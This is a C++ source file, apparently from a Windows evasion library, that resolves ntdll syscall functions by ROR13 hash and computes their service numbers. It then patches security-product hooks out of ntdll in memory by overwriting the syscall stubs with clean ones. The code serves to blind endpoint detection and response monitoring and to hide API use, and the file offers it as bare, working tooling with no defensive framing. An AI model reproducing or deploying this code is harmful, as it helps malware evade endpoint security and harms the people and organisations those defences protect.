#include "unhook.h"
#include "./hash/hash.h"

DWORD findWow64DsRva() {
	auto ntdll = craftunhook::ntdll;

	auto expDir = ntdll.ExportDirectory;
	auto baseNtdll = ntdll.OptionalHeader.ImageBase;

	PDWORD addrOfNameRvas = (PDWORD)(baseNtdll + expDir->AddressOfNames);
	PWORD addrOfOrds = (PWORD)(baseNtdll + expDir->AddressOfNameOrdinals);
	PDWORD addrOfFnRvas = (PDWORD)(baseNtdll + expDir->AddressOfFunctions);

	for (size_t i = 1; i < expDir->NumberOfFunctions; i++)
	{
		LPCSTR fnName = (LPCSTR)(baseNtdll + addrOfNameRvas[i]);

		if (strncmp(fnName, "Zw", 2) && strcmp(fnName, "ZwQuerySystemTime"))
			continue;

		WORD fnOrd = addrOfOrds[i];
		PVOID fnAddr = (PVOID)(baseNtdll + addrOfFnRvas[fnOrd]);

		for (size_t x = 0; x <= craftunhook::stubSize; x++)
		{
			if (!memcmp((PBYTE)((uintptr_t)fnAddr + x), craftunhook::wow64TestStart, 3)) {
				DWORD rva = *(PDWORD)((uintptr_t)fnAddr + x + 3);
				return rva;
			}
		}
	}

	return 0;
}

DWORD getFnSsnFromName(DWORD procHash) {
	auto ntdll = craftunhook::ntdll;

	auto baseNtdll = ntdll.OptionalHeader.ImageBase;

	auto expDir = ntdll.ExportDirectory;
	auto rtf = ntdll.RunTimeEntryTable;
	
	PDWORD addrOfNameRvas = (PDWORD)(baseNtdll + expDir->AddressOfNames);
	PWORD addrOfOrds = (PWORD)(baseNtdll + expDir->AddressOfNameOrdinals);
	PDWORD addrOfFnRvas = (PDWORD)(baseNtdll + expDir->AddressOfFunctions);

	DWORD index = 0;
	DWORD ssn = 0;

	while (rtf[index].BeginAddress) {

		for (size_t i = 0; i < expDir->NumberOfFunctions; i++)
		{
			LPCSTR fnName = (LPCSTR)(baseNtdll + addrOfNameRvas[i]);

			if (strncmp(fnName, "Zw", 2))
				continue;

			WORD fnOrd = addrOfOrds[i];
			DWORD fnRva = addrOfFnRvas[fnOrd];
			
			if (fnRva == rtf[index].BeginAddress) {

				if (hash::ror13(fnName) == procHash) {
					return ssn;
				}

				ssn++;
			}

		}

		index++;
	}

	return 0;
}

PVOID getNtFunctionByHash(DWORD procHash) {
	auto ntdll = craftunhook::ntdll;

	auto baseNtdll = ntdll.OptionalHeader.ImageBase;
	auto expDir = ntdll.ExportDirectory;

	PDWORD addrOfNameRvas = (PDWORD)(baseNtdll + expDir->AddressOfNames);
	PWORD addrOfOrds = (PWORD)(baseNtdll + expDir->AddressOfNameOrdinals);
	PDWORD addrOfFnRvas = (PDWORD)(baseNtdll + expDir->AddressOfFunctions);

	for (size_t i = 0; i < expDir->NumberOfFunctions; i++)
	{
		LPCSTR fnName = (LPCSTR)(baseNtdll + addrOfNameRvas[i]);

		if (strncmp(fnName, "Zw", 2))
			continue;

		WORD fnOrd = addrOfOrds[i];
		DWORD fnRva = addrOfFnRvas[fnOrd];

		if (hash::ror13(fnName) == procHash) {
			return (PVOID)((ULONG_PTR)baseNtdll + fnRva);
		}
	}

	return NULL;
}

bool craftunhook::init() {
	craftunhook::wow64DsRva = findWow64DsRva();
	memcpy(&craftunhook::stubTemplate[11], &craftunhook::wow64DsRva, sizeof(craftunhook::wow64DsRva));
	return craftunhook::wow64DsRva != 0;
}

Unhook::Unhook(DWORD procHash) {
	this->procHash = procHash;
	this->procAddress = getNtFunctionByHash(procHash);
	this->orgProc = NULL;
}

Unhook::~Unhook() {
	if (this->orgProc) {
		free(this->orgProc);
	}
}

bool craftunhook::isHookedByHash(DWORD procHash) {
	return memcmp(getNtFunctionByHash(procHash), craftunhook::stubStart, 4);
}

bool Unhook::unhook() {
	BOOL success = false;

	if (!craftunhook::isHookedByHash(this->procHash))
		return success;

	if (!craftunhook::wow64DsRva)
		return success;
	
	DWORD ssn = getFnSsnFromName(this->procHash);

	memcpy(&craftunhook::stubTemplate[4], &ssn, sizeof(ssn));

	DWORD oldProtection = 0;
	success = VirtualProtect(this->procAddress, craftunhook::stubSize, PAGE_EXECUTE_READWRITE, &oldProtection);

	this->orgProc = malloc(craftunhook::stubSize);
	memcpy(this->orgProc, this->procAddress, craftunhook::stubSize);

	memcpy(this->procAddress, craftunhook::stubTemplate, craftunhook::stubSize);

	success = VirtualProtect(this->procAddress, craftunhook::stubSize, oldProtection, &oldProtection);

	DWORD zeroSsn = 0;
	memcpy(&craftunhook::stubTemplate[4], &zeroSsn, sizeof(ssn));

	return success;
}

bool Unhook::restore() {
	BOOL success = false;

	if (!this->orgProc)
		return success;

	DWORD oldProtection = 0;
	success = VirtualProtect(this->procAddress, craftunhook::stubSize, PAGE_EXECUTE_READWRITE, &oldProtection);

	memcpy(this->procAddress, this->orgProc, craftunhook::stubSize);
	
	success = VirtualProtect(this->procAddress, craftunhook::stubSize, oldProtection, &oldProtection);

	return success;
}